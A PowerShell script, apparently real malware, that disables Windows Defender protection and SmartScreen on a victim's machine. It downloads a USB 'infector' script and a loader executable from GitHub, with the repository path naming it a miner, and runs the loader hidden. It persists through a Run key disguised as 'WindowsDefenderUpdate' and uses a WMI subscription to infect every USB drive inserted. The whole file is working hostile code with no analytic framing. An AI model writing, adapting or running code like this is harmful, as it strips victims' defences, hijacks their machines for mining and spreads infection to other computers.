# PowerShell script to add Windows Defender exclusions and set up defendnot-loader.exe

Start-Sleep -Seconds 15

$monitorScriptPath = "C:\Windows\Temp\monitor.ps1"
$infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/defendnot-loader.exe"
$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore_x64.zip"
$crackedSoftwareZipPath = "C:\Windows\Temp\update_package_x64.zip"
$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices_x64"
$payloadPath = "$crackedSoftwareFolder\defendnot-loader.exe"

function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

$maxAttempts = 20
$delayBetweenChecks = 5
for ($i = 0; $i -lt $maxAttempts; $i++) {
    try {
        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
            break
        }
    } catch {
    }
    Start-Sleep -Seconds $delayBetweenChecks
}

$exclusionsPaths = @(
    "C:\Users\Public\SystemLib",
    "$crackedSoftwareFolder",
    "$crackedSoftwareZipPath",
    "C:\ProgramData\WinKit",
    "C:\Windows\Temp\*",
    "C:\ProgramData\Microsoft\Windows\Temp",
    "C:\Users\*\AppData\Local\Temp",
    "C:\Windows\System32\Tasks",
    "C:\Windows\SysWOW64\Tasks",
    "C:\Program Files\McAfee",
    "C:\Program Files\Symantec",
    "C:\Program Files\Kaspersky Lab",
    "C:\Program Files\Avast Software",
    "C:\Program Files\AVG",
    $monitorScriptPath
)
$exclusionsProcesses = @(
    "defendnot-loader.exe",
    "ServiceHost.exe",
    "cmd.exe",
    "powershell.exe"
)
$exclusionsExtensions = @(
    "exe",
    "dll",
    "bin",
    "pdb",
    "ps1",
    "vbs",
    "js",
    "zip"
)
foreach ($excl in $exclusionsPaths) {
    try {
        $currentExclusions = Get-MpPreference
        $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $pathExists) {
            Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
        }
    } catch {
    }
}
foreach ($excl in $exclusionsProcesses) {
    try {
        $currentExclusions = Get-MpPreference
        $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $processExists) {
            Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
        }
    } catch {
    }
}
foreach ($excl in $exclusionsExtensions) {
    try {
        $currentExclusions = Get-MpPreference
        $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $extensionExists) {
            Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
        }
    } catch {
    }
}

try {
    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -ne "Off") {
        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
    }
} catch {
}

$retryCount = 3

if (-not (Test-Path -Path $monitorScriptPath)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $infectorUrl -OutFile $monitorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            if (-not (Test-Path -Path $monitorScriptPath)) {
                throw "Downloaded monitor.ps1 not found at $monitorScriptPath."
            }
            Unblock-File -Path $monitorScriptPath -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
}

if (-not (Test-Path -Path $crackedSoftwareFolder)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
                throw "Downloaded zip file not found at $crackedSoftwareZipPath."
            }
            Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
            if (-not (Test-Path -Path $payloadPath)) {
                throw "Payload executable missing."
            }
            Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
}

if (Test-Path -Path $payloadPath) {
    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -eq ".exe") {
        try {
            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
        } catch {
        }
    }
}

try {
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsDefenderUpdate"
    $command = "$crackedSoftwareFolder\defendnot-loader.exe"
    $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    if ($regExists -and $regExists.WindowsDefenderUpdate -eq $command) {
    } else {
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name $regName -Value $command -ErrorAction Stop
    }
} catch {
}

try {
    $filterName = "USBInsertionFilter"
    $consumerName = "USBMonitorConsumer"
    $existingFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'"
    $existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'"
    $existingBinding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__EventFilter.Name='$filterName'"" AND Consumer = ""CommandLineEventConsumer.Name='$consumerName'"""
    if ($existingFilter -and $existingConsumer -and $existingBinding) {
    } else {
        if ($existingBinding) {
            $existingBinding | Remove-WmiObject
        }
        if ($existingFilter) {
            $existingFilter | Remove-WmiObject
        }
        if ($existingConsumer) {
            $existingConsumer | Remove-WmiObject
        }
        $query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType=2"
        $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $filterName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = $query
        }
        $commandLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$monitorScriptPath`" -DriveLetter %TargetInstance.DeviceID%"
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $consumerName
            CommandLineTemplate = $commandLine
        }
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $filter
            Consumer = $consumer
        }
    }
} catch {
}

Write-Host "Setup completed successfully."
